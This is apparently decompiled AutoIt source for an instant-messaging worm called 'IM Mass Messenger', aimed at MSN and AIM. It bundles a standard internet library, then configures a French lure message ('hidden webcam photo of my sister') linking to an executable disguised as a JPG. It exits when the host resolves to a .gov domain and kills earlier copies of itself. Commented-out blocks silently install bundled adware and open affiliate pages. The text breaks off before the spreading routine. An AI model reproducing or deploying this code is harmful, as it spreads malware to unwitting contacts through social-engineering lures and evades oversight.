; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: F:\Hå©kîñg\PRIV\im++\im++.au3>
; ----------------------------------------------------------------------------

;; IM "Mass Messenger" v1.43 Fixed
;;
;; MSN 7.x / WLM and AIM 6.0 integrated.
;;
;; This Code is for Educational Purposes Only.
;;
;; 3rd Copy givin' to duffbeer.
;;
;; Keep it private , Don't leak it , it's  worth it.
;;
;; ;x


		;;;;;;;;;;;;;;;;;;;;;;;     ;;;;;;         ;;;;;;
	   ;;;;;;;;;;;;;;;;;;;;;;;      ;;;;		   ;;;;
      ;;;;;;; 				       ;;;;  		  ;;;;
     ;;;;;;;;;;;;;;;;;;;;;;;      ;;;; 			 ;;;;
    ;;;;;;;;;;;;;;;;;;;;;;;		 ;;;;           ;;;;
   ;;;;;;;					    ;;;;  Coding   ;;;;
  ;;;;;;;				       ;;;; <  By  >  ;;;;
 ;;;;;;;                      ;;;; XFREGGIRT ;;;;
;;;:;;; 				     ;;;;;;;;;;;;;;;;;;;

;; Fixed MSN WLM
;; Fixed MSN 7.X
;; Fixed AIM 6.0
;; Fixed Language Support
;;
;; Todo:
;;
;; - ICQ , XFIRE , SKYPE , gAim , All Other GTK's.
;;

#NoTrayIcon

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\iNet.au3>
; ----------------------------------------------------------------------------

; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.0
; Language:       English
; Description:    Functions that assist with Internet.
;
; ------------------------------------------------------------------------------
;===============================================================================
;
; Function Name:    _GetIP()
; Description:      Get public IP address of a network/computer.
; Parameter(s):     None
; Requirement(s):   Internet access.
; Return Value(s):  On Success - Returns the public IP Address
;                   On Failure - -1  and sets @ERROR = 1
; Author(s):        Larry/Ezzetabi & Jarvis Stubblefield
;
;===============================================================================
Func _GetIP()
	Local $ip, $t_ip
	If InetGet("http://checkip.dyndns.org/?rnd1=" & Random(1, 65536) & "&rnd2=" & Random(1, 65536), @TempDir & "\~ip.tmp") Then
		$ip = FileRead(@TempDir & "\~ip.tmp", FileGetSize(@TempDir & "\~ip.tmp"))
		FileDelete(@TempDir & "\~ip.tmp")
		$ip = StringTrimLeft($ip, StringInStr($ip, ":") + 1)
		$ip = StringTrimRight($ip, StringLen($ip) - StringInStr($ip, "/") + 2)
		$t_ip = StringSplit($ip, '.')
		If $t_ip[0] = 4 And StringIsDigit($t_ip[1]) And StringIsDigit($t_ip[2]) And StringIsDigit($t_ip[3]) And StringIsDigit($t_ip[4]) Then
			Return $ip
		EndIf
	EndIf
	If InetGet("http://www.whatismyip.com/?rnd1=" & Random(1, 65536) & "&rnd2=" & Random(1, 65536), @TempDir & "\~ip.tmp") Then
		$ip = FileRead(@TempDir & "\~ip.tmp", FileGetSize(@TempDir & "\~ip.tmp"))
		FileDelete(@TempDir & "\~ip.tmp")
		$ip = StringTrimLeft($ip, StringInStr($ip, "Your ip is") + 10)
		$ip = StringLeft($ip, StringInStr($ip, " ") - 1)
		$ip = StringStripWS($ip, 8)
		$t_ip = StringSplit($ip, '.')
		If $t_ip[0] = 4 And StringIsDigit($t_ip[1]) And StringIsDigit($t_ip[2]) And StringIsDigit($t_ip[3]) And StringIsDigit($t_ip[4]) Then
			Return $ip
		EndIf
	EndIf
	SetError(1)
	Return -1
EndFunc   ;==>_GetIP

;===============================================================================
;
; Function Name:    _INetExplorerCapable()
; Description:      Convert a string to IE capable line
; Parameter(s):     $s_IEString - String to convert to a capable IExplorer line
; Requirement(s):   None
; Return Value(s):  On Success - Returns the converted string
;                   On Failure - Blank String and @error = 1
; Author(s):        Wes Wolfe-Wolvereness <Weswolf at aol dot com>
;
;===============================================================================
;
Func _INetExplorerCapable($s_IEString)
	If StringLen($s_IEString) <= 0 Then
		Return ''
		SetError(1)
	Else
		Local $s_IEReturn
		Local $i_IECount
		Local $n_IEChar
		For $i_IECount = 1 To StringLen($s_IEString)
			$n_IEChar = '0x' & Hex(Asc(StringMid($s_IEString, $i_IECount, 1)), 2)
			If $n_IEChar < 0x21 Or $n_IEChar = 0x25 Or $n_IEChar = 0x2f Or $n_IEChar > 0x7f Then
				$s_IEReturn = $s_IEReturn & '%' & StringRight($n_IEChar, 2)
			Else
				$s_IEReturn = $s_IEReturn & Chr($n_IEChar)
			EndIf
		Next
		Return $s_IEReturn
	EndIf
EndFunc   ;==>_INetExplorerCapable

;===============================================================================
;
; Function Name:    _INetGetSource()
; Description:      Gets the source from an URL without writing a temp file.
; Parameter(s):     $s_URL = The URL of the site.
; Requirement(s):   DllCall/Struct & WinInet.dll
; Return Value(s):  On Success - Returns the source code.
;                   On Failure - 0  and sets @ERROR = 1
; Author(s):        Wouter van Kesteren.
;
;===============================================================================
Func _INetGetSource($s_URL, $s_Header = '')

	If StringLeft($s_URL, 7) <> 'http://' And StringLeft($s_URL, 8) <> 'https://' Then $s_URL = 'http://' & $s_URL

	Local $h_DLL = DllOpen("wininet.dll")

	Local $ai_IRF, $s_Buf = ''

	Local $ai_IO = DllCall($h_DLL, 'int', 'InternetOpen', 'str', "AutoIt v3", 'int', 0, 'int', 0, 'int', 0, 'int', 0)
	If @error Or $ai_IO[0] = 0 Then
		DllClose($h_DLL)
		SetError(1)
		Return ""
	EndIf

	Local $ai_IOU = DllCall($h_DLL, 'int', 'InternetOpenUrl', 'int', $ai_IO[0], 'str', $s_URL, 'str', $s_Header, 'int', StringLen($s_Header), 'int', 0x80000000, 'int', 0)
	If @error Or $ai_IOU[0] = 0 Then
		DllCall($h_DLL, 'int', 'InternetCloseHandle', 'int', $ai_IO[0])
		DllClose($h_DLL)
		SetError(1)
		Return ""
	EndIf

	Local $v_Struct = DllStructCreate('udword')
	DllStructSetData($v_Struct, 1, 1)

	While DllStructGetData($v_Struct, 1) <> 0
		$ai_IRF = DllCall($h_DLL, 'int', 'InternetReadFile', 'int', $ai_IOU[0], 'str', '', 'int', 256, 'ptr', DllStructGetPtr($v_Struct))
		$s_Buf &= StringLeft($ai_IRF[2], DllStructGetData($v_Struct, 1))
	WEnd

	DllCall($h_DLL, 'int', 'InternetCloseHandle', 'int', $ai_IOU[0])
	DllCall($h_DLL, 'int', 'InternetCloseHandle', 'int', $ai_IO[0])
	DllClose($h_DLL)
	Return $s_Buf
EndFunc   ;==>_INetGetSource

;===============================================================================
;
; Function Name:    _INetMail()
; Description:      Open default mail client with given Address/Subject/Body
; Parameter(s):     $s_MailTo    - Address for E-Mail
;                   $s_Subject   - Subject <Weswolf at aol dot com>of E-Mail
;                   $s_MailBody  - Body of E-Mail
; Requirement(s):   _INetExplorerCapable
; Return Value(s):  On Success - Process ID of e-mail client
;                   On Failure - If Opt('RunErrorsFatal', 1)
;                                   -> Crash
;                                Else Opt('RunErrorsFatal', 0)
;                                   -> Blank String and @error = 1
; Author(s):        Wes Wolfe-Wolvereness <Weswolf at aol dot com>
;
;===============================================================================
;
Func _INetMail($s_MailTo, $s_MailSubject, $s_MailBody)
	Local $prev = opt("ExpandEnvStrings", 1)
	Local $var = RegRead('HKCR\mailto\shell\open\command', "")
	Local $ret = Run(StringReplace($var, '%1', _INetExplorerCapable('mailto:' & $s_MailTo & '?subject=' & $s_MailSubject & '&body=' & $s_MailBody)))
	opt("ExpandEnvStrings", $prev)
	Return $ret
EndFunc   ;==>_INetMail

;===============================================================================
;
; Function Name:    _INetSmtpMail()
; Description:      Sends an email using SMTP over TCP IP.
; Parameter(s):     $s_SmtpServer	- SMTP server to be used for sending email
;                   $s_FromName		- Name of sender
;                   $s_FromAddress	- eMail address of sender
;                   $s_ToAddress	- Address that email is to be sent to
;                   $s_Subject		- Subject of eMail
;					$as_Body		- Single dimension array containing the body of eMail as strings
;					$s_helo			- Helo identifier (default @COMPUTERNAME) sometime needed by smtp server
;					$s_first		- send before Helo identifier (default @CRLF) sometime needed by smtp server
;					$b_trace		- trace on a splash window (default 0 = no trace)
; Requirement(s):   None
; Return Value(s):  On Success - Returns 1
;                   On Failure - 0  and sets
;											@ERROR = 1		-	Invalid Parameters
;											@ERROR = 2		-	Unable to start TCP
;											@ERROR = 3		-	Unable to resolve IP
;											@ERROR = 4		-	Unable to create socket
;											@ERROR = 5x		-	Cannot open SMTP session
;											@ERROR = 50x	-	Cannot send body
;											@ERROR = 5000	-	Cannot close SMTP session
; Authors:        Original function to send email via TCP 	- Asimzameer
;					Conversion to UDF						- Walkabout
;					Correction	Helo, timeout, trace		- Jpm
;					Correction send before Helo				- Jpm
;
;===============================================================================
Func _INetSmtpMail($s_SmtpServer, $s_FromName, $s_FromAddress, $s_ToAddress, $s_Subject = "", $as_Body = "", $s_helo = "", $s_first=" ", $b_trace = 0)

	Local $v_Socket
	Local $s_IPAddress
	Local $i_Count
	Local $s_Send[6]
	Local $s_ReplyCode[6];Return code from SMTP server indicating success

	If $s_SmtpServer = "" Or $s_FromAddress = "" Or $s_ToAddress = "" Or $s_FromName = "" Or StringLen($s_FromName) > 256 Then
		SetError(1)
		Return 0
	EndIf
	If $s_helo = "" Then $s_helo = @ComputerName
	If TCPStartup() = 0 Then
		SetError(2)
		Return 0
	EndIf
	StringRegExp($s_SmtpServer, "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)")
	If @extended Then
		$s_IPAddress = $s_SmtpServer
	Else
		$s_IPAddress = TCPNameToIP($s_SmtpServer)
	EndIf
	If $s_IPAddress = "" Then
		TCPShutdown()
		SetError(3)
		Return 0
	EndIf
	$v_Socket = TCPConnect($s_IPAddress, 25)
	If $v_Socket = -1 Then
		TCPShutdown()
		SetError(4)
		Return (0)
	EndIf

	$s_Send[0] = "HELO " & $s_helo & @CRLF
	If StringLeft($s_helo,5) = "EHLO " Then $s_Send[0] = $s_helo & @CRLF
	$s_ReplyCode[0] = "250"

	$s_Send[1] = "MAIL FROM: <" & $s_FromAddress & ">" & @CRLF
	$s_ReplyCode[1] = "250"
	$s_Send[2] = "RCPT TO: <" & $s_ToAddress & ">" & @CRLF
	$s_ReplyCode[2] = "250"
	$s_Send[3] = "DATA" & @CRLF
	$s_ReplyCode[3] = "354"

	$s_Send[4] = 	"From:" & $s_FromName & "<" & $s_FromAddress & ">" & @CRLF & _
			"To:" & "<" & $s_ToAddress & ">" & @CRLF & _
			"Subject:" & $s_Subject & @CRLF & _
			"Mime-Version: 1.0" & @CRLF & _
			"Content-Type: text/plain; charset=US-ASCII" & @CRLF & _
			@CRLF
	$s_ReplyCode[4] = ""

	$s_Send[5] = @CRLF & "." & @CRLF
	$s_ReplyCode[5] = "250"

	; open stmp session
	If _SmtpSend($v_Socket, $s_Send[0], $s_ReplyCode[0], $b_trace, "220", $s_first) Then
		SetError(50)
		Return 0
	EndIf
	; send header
	For $i_Count = 1 To UBound($s_Send) - 2
		If _SmtpSend($v_Socket, $s_Send[$i_Count], $s_ReplyCode[$i_Count], $b_trace) Then
			SetError(50 + $i_Count)
			Return 0
		EndIf
	Next

	; send body records (a record can be multiline : take care of a subline beginning with a dot should be ..)
	For $i_Count = 0 To UBound($as_Body) - 1
		; correct line beginning with a dot
		If StringLeft($as_Body[$i_Count], 1) = "." Then $as_Body[$i_Count] = "." & $as_Body[$i_Count]

		If _SmtpSend($v_Socket, $as_Body[$i_Count] & @CRLF, "", $b_trace) Then
			SetError(500 + $i_Count)
			Return 0
		EndIf
	Next

	; close the smtp session
	$i_Count = UBound($s_Send) - 1
	If _SmtpSend($v_Socket, $s_Send[$i_Count], $s_ReplyCode[$i_Count], $b_trace) Then
		SetError(5000)
		Return 0
	EndIf

	TCPCloseSocket($v_Socket)
	TCPShutdown()
	Return 1
EndFunc   ;==>_INetSmtpMail

; internals routines----------------------------------
Func _SmtpTrace($str, $timeout = 0)
	Local $W_TITLE = "SMTP trace"
	Local $g_smtptrace = ControlGetText($W_TITLE, "", "Static1")
	$str = StringLeft(StringReplace($str, @CRLF, ""), 70)
	$g_smtptrace &= @HOUR & ":" & @MIN & ":" & @SEC & " " & $str & @LF
	If WinExists($W_TITLE) Then
		ControlSetText($W_TITLE, "", "Static1", $g_smtptrace)
	Else
		SplashTextOn($W_TITLE, $g_smtptrace, 400, 500, 500, 100, 4 + 16, "", 8)
	EndIf
	If $timeout Then Sleep($timeout * 1000)
EndFunc   ;==>_SmtpTrace

Func _SmtpSend($v_Socket, $s_Send, $s_ReplyCode, $b_trace, $s_IntReply="", $s_first="")
    Local $s_Receive, $i, $timer
    If $b_trace Then _SmtpTrace($s_Send)

    If $s_IntReply <> ""  Then

        ; Send special first char to awake smtp server
        If $s_first <> -1 Then
            If TCPSend($v_Socket, $s_first) = 0 Then
                TCPCloseSocket($v_Socket)
                TCPShutdown()
                Return 1; cannot send
            EndIf
        EndIf

        ; Check intermediate reply before HELO acceptation
        $s_Receive = ""
        $timer = TimerInit()
        While StringLeft($s_Receive,StringLen($s_IntReply)) <> $s_IntReply And TimerDiff($timer) < 45000
            $s_Receive = TCPRecv($v_Socket, 1000)
            If $b_trace And $s_Receive <> "" Then _SmtpTrace("intermediate->" & $s_Receive)
        WEnd
    EndIf

    ; Send string.
    If TCPSend($v_Socket, $s_Send) = 0 Then
        TCPCloseSocket($v_Socket)
        TCPShutdown()
        Return 1; cannot send
    EndIf

    $timer = TimerInit()

    $s_Receive = ""
    While $s_Receive = "" And TimerDiff($timer) < 45000
        $i += 1
        $s_Receive = TCPRecv($v_Socket, 1000)
        If $s_ReplyCode = "" Then ExitLoop
    WEnd

    If $s_ReplyCode <> "" Then
        ; Check replycode
        If $b_trace Then _SmtpTrace($i & " <- " & $s_Receive)

        If StringLeft($s_Receive, StringLen($s_ReplyCode)) <> $s_ReplyCode Then
            TCPCloseSocket($v_Socket)
            TCPShutdown()
            If $b_trace Then _SmtpTrace("<-> " & $s_ReplyCode, 5)
            Return 2; bad receive code
        EndIf
    EndIf

    Return 0
EndFunc   ;==>_SmtpSend

;===============================================================================
;
; Description:      Resolves IP adress to Hostname
; CallTip:			_TCPIpToName($sIp, [$iOption = 0], [$hDll_Ws2_32 = "Ws2_32.dll"])
; Parameter(s):     $sIp - Ip Adress in dotted (v4) Format
;					$iOption - Optional, Default = 0
;						0 = Return String Hostname
;						1 = Return Array (see Notes)
;                   $hDll_Ws2_32 - Optional, Handle to Ws2_32.dll
; Requirement(s):   AutoIt 3.2.1.12+, Successfull TCPStartup
; Return Value(s):  On Success - Hostname or Array (see Notes)
;                   On Failure - ""  and Set
;                                   @ERROR to:  1 - inet_addr DllCall Failed
;                                               2 - inet_addr Failed
;                                               3 - gethostbyaddr DllCall Failed
;												4 - gethostbyaddr Failed, WSAGetLastError = @Extended
;												5 - gethostbyaddr Failed, WSAGetLastError Failed
;												6 - strlen/sZStringRead Failed
;												7 - Error reading Aliases Array
; Author(s):        Florian Fida
; Note(s):			A successfull WSAStartup (Done by TCPStartup) is required.
;					if $iOption = 1 then the returned Array looks Like this:
;						$aResult[0] = Number of elemets
;						$aResult[1] = "Hostname"
;						$aResult[2] = "Alias 1"
;						$aResult[3] = "Alias 2"
;						...
;
;===============================================================================

Func _TCPIpToName($sIp, $iOption = Default, $hDll_Ws2_32 = Default)
	Local $vbinIP, $vaDllCall, $vptrHostent, $vHostent, $sHostnames, $vh_aliases, $i
	Local $INADDR_NONE = 0xffffffff, $AF_INET = 2, $sSeperator = @CR
	If $iOption = Default Then $iOption = 0
	If $hDll_Ws2_32 = Default Then $hDll_Ws2_32 = "Ws2_32.dll"
	$vaDllCall = DllCall($hDll_Ws2_32, "long", "inet_addr", "str", $sIp)
	If @error Then Return SetError(1, 0, "") ; inet_addr DllCall Failed
	$vbinIP = $vaDllCall[0]
	If $vbinIP = $INADDR_NONE Then Return SetError(2, 0, "") ; inet_addr Failed
	$vaDllCall = DllCall($hDll_Ws2_32, "ptr", "gethostbyaddr", "long_ptr", $vbinIP, "int", 4, "int", $AF_INET)
	If @error Then Return SetError(3, 0, "") ; gethostbyaddr DllCall Failed
	$vptrHostent = $vaDllCall[0]
	If $vptrHostent = 0 Then
		$vaDllCall = DllCall($hDll_Ws2_32, "int", "WSAGetLastError")
		If @error Then Return SetError(5, 0, "") ; gethostbyaddr Failed, WSAGetLastError Failed
		Return SetError(4, $vaDllCall[0], "") ; gethostbyaddr Failed, WSAGetLastError = @Extended
	EndIf
	$vHostent = DllStructCreate("ptr;ptr;short;short;ptr", $vptrHostent)
	$sHostnames = __TCPIpToName_szStringRead(DllStructGetData($vHostent, 1))
	If @error Then Return SetError(6, 0, $sHostnames) ; strlen/sZStringRead Failed
	If $iOption = 1 Then
		$sHostnames &= $sSeperator
		For $i = 0 To 63 ; up to 64 Aliases
			$vh_aliases = DllStructCreate("ptr", DllStructGetData($vHostent, 2) + ($i * 4))
			If DllStructGetData($vh_aliases, 1) = 0 Then ExitLoop ; Null Pointer
			$sHostnames &= __TCPIpToName_szStringRead(DllStructGetData($vh_aliases, 1))
			If @error Then
				SetError(7) ; Error reading array
				ExitLoop
			EndIf
		Next
		Return StringSplit(StringStripWS($sHostnames, 2), @CR)
	Else
		Return $sHostnames
	EndIf
EndFunc   ;==>_TCPIpToName

; Internal
Func __TCPIpToName_szStringRead($iszPtr, $iLen = -1, $hDll_msvcrt = "msvcrt.dll")
	Local $aStrLen, $vszString
	If $iszPtr < 1 Then Return "" ; Null Pointer
	If $iLen < 0 Then
		$aStrLen = DllCall($hDll_msvcrt, "int", "strlen", "ptr", $iszPtr)
		If @error Then Return SetError(1, 0, "") ; strlen Failed
		$iLen = $aStrLen[0] + 1
	EndIf
	$vszString = DllStructCreate("char[" & $iLen & "]", $iszPtr)
	If @error Then Return SetError(2, 0, "")
	Return SetError(0, $iLen, DllStructGetData($vszString, 1))
EndFunc   ;==>__TCPIpToName_szStringRead

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\iNet.au3>
; ----------------------------------------------------------------------------

;#include <IE.au3>

AutoItSetOption("MouseCoordMode", 1)
AutoItSetOption("WinTitleMatchMode", 4)

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Variables																													;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

Dim $MON , $KEY , $TEMP , $GETPID , $GETPID2 , $PID , $MSGBOXON , $IESPAM ;; Global

Dim $BUTT , $SEX , $NIGA , $KNETA , $TEAMA , $AIMHOME ;; AIM

Dim $NIGB , $KNETB , $TEAMB , $MSNHOME ;; MSN

Dim $SPAMNOW , $SPAMCOUNT , $ENDOFLIST , $MSNHOME2 , $IMSPAMPICK , $NOTSIGNEDIN , $INPUTSPAM , $JUMPFIRST4 ;; Spam related

Dim $MSN , $AIM ;; IM

Dim $sIp , $HOSTCHKON , $IP , $IPZ , $HOST ;; Host Check

Dim $ENG , $GER , $ITA , $SPA , $FRA , $NED , $BEL , $NOR , $SWE ;; Languages

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Start Values																													;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

$BUTT = True
$SEX = 0 ;; AIM Switch , dont change
$AIMHOME = False ;; Press Home Key in AIM Online/Offline spread , dont change
$MSNHOME = False ;; Press Home Key in MSN Online spread , dont change
$MSNHOME2 = False ;; Press Home Key in MSN Offline spread , dont change
$MON = True
$KEY = True
$TEAMB = True
$INPUTSPAM = True
$IESPAM = True
$MSGBOXON = False

$SPAMNOW = 1
$SPAMCOUNT = 0 ;; Counts the spammed conversations.
$ENDOFLIST = 0 ;; Checks if Buddylist has ended. First Online list which will turn it to 1 , Then Offline list which will turn it to 2 and exit.
$IMSPAMPICK = 1 ;; Picks AIM or MSN, dont change
$NOTSIGNEDIN = "15528950" ;; If MSN isnt signed in dont spam
$HOSTCHKON = 1 ;; Dont change if you want to spread your txt.
$JUMPFIRST4 = 0

#comments-start
Dim $DEST2
Dim $DEST

$DEST = @WindowsDir & "\instr32.exe" ;; Destination of Included Exe
$DEST2 = @WindowsDir & "\instr64.exe" ;; Destination of Included Exe

;; Adware or other Exe you might want to include ;)
FileInstall ( "c:\bla\r.exe", $DEST , 1 )
Run( $DEST , "" ,  @SW_HIDE ) ;; Run Included Exe


;; Adware or other Exe you might want to include ;)
FileInstall ( "c:\bla\m.exe", $DEST2 , 1 )
Run( $DEST2 , "" ,  @SW_HIDE ) ;; Run Included Exe
#comments-end

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Start of Config 																												;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;; Change Spam Sentence between ""


;; English v
$ENG = "lol j'ai fais une pose de ma soeur hier en cachette avec ma webcam regarde ca http://www.dungtrin.com/webcam_00002.com?.jpg :D  "

;; German v
$GER = "lol j'ai fais une pose de ma soeur hier en cachette avec ma webcam regarde ca http://www.dungtrin.com/webcam_00002.com?.jpg :D  "

;; Italian v
$ITA = "lol j'ai fais une pose de ma soeur hier en cachette avec ma webcam regarde ca http://www.dungtrin.com/webcam_00002.com?.jpg :D  "

;; Spanish v
$SPA = "lol j'ai fais une pose de ma soeur hier en cachette avec ma webcam regarde ca http://www.dungtrin.com/webcam_00002.com?.jpg :D  "

;; French v
$FRA = "lol j'ai fais une pose de ma soeur hier en cachette avec ma webcam regarde ca http://www.dungtrin.com/webcam_00002.com?.jpg :D  "

;; Dutch v
$NED = " lol j'ai fais une pose de ma soeur hier en cachette avec ma webcam regarde ca http://www.dungtrin.com/webcam_00002.com?.jpg :D "

;; Belgic v
$BEL = "lol j'ai fais une pose de ma soeur hier en cachette avec ma webcam regarde ca http://www.dungtrin.com/webcam_00002.com?.jpg :D "

;; Norwegian  v
$NOR = "lol j'ai fais une pose de ma soeur hier en cachette avec ma webcam regarde ca http://www.dungtrin.com/webcam_00002.com?.jpg :D "

;; Sweden v
$SWE = "lol j'ai fais une pose de ma soeur hier en cachette avec ma webcam regarde ca http://www.dungtrin.com/webcam_00002.com?.jpg :D "


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; End of Config 																												;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



;; Kill other exe of this code running so no lock up can occur.
if FileExists( @WindowsDir & "\windebug.log" ) Then
$GETPID = FileRead( @WindowsDir & "\windebug.log" )
ProcessClose ( $GETPID )
FileDelete( @WindowsDir & "\windebug.log" )
EndIf
FileWrite( @WindowsDir & "\windebug.log" , @AutoItPID )

;; Delete other exe of this code running
;if FileExists( @WindowsDir & "\windebug2.log" ) Then
;$GETPID2 = FileRead( @WindowsDir & "\windebug2.log" )
;$PID = StringRight( $GETPID2 , 10 )
;FileDelete( @WindowsDir & "\windebug2.log" )
;EndIf
;FileWrite( @WindowsDir & "\windebug2.log" , @AutoItExe )

#comments-start
While $IESPAM = True
	_IECreate ("http://knetknet.imarichkid.hop.clickbank.net", 1, 1, 0)
	Sleep( 1800000 )
	_IECreate ("http://knetknet.dayjobkill.hop.clickbank.net", 1, 1, 0)
	Sleep( 1800000 )
	_IECreate ("http://knetknet.duvetdolla.hop.clickbank.net", 1, 1, 0)
	Sleep( 1800000 )
	$IESPAM = False
WEnd
#comments-end

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;  Host Check System v1.0																										;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

$IP = _GetIP() ;; Get IP
$sIp = _TCPIpToName($IP) ;; Translate IP to Hostname
$IPZ = StringRight ( $sIp, 3 ) ;; Get last 3 characters of host
$HOST = _Language()

;; GOV O_O AAAAAAH EXIT!
if $IPZ = "gov" Then
	Exit
EndIf

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;  Get Language Function =]																									;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

Func _Language()
Select
    Case StringInStr("0413", @OSLang)
        Return "NL"

	Case StringInStr("0813", @OSLang)
        Return "BE"

    Case StringInStr("0409,0809,0c09,1009,1409,1809,1c09,2009, _2409,2809,2c09,3009,3409", @OSLang)
        Return "EN"

    Case StringInStr("040c,080c,0c0c,100c,140c,180c", @OSLang)
        Return "FR"

    Case StringInStr("0407,0807,0c07,1007,1407", @OSLang)
        Return "DE"

    Case StringInStr("0410,0810", @OSLang)
        Return "IT"

    Case StringInStr("0414,0814", @OSLang)
       Return "NO"

    Case StringInStr("040a,080a,0c0a,100a,140a,180a,1c0a,200a, _240a,280a,2c0a,300a,340a,380a,3c0a,400a, _440a,480a,4c0a,500a", @OSLang)
        Return "ES"

    Case StringInStr("041d,081d", @OSLang)
        Return "SE"

	;Case StringInStr("0415", @OSLang)
    ;    Return "PL"

    ;Case StringInStr("0416,0816", @OSLang)
    ;    Return "PT"

    Case Else
        Return "Other"

    EndSelect
EndFunc

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;  Which IM shall we rwn today? <.<																										;;
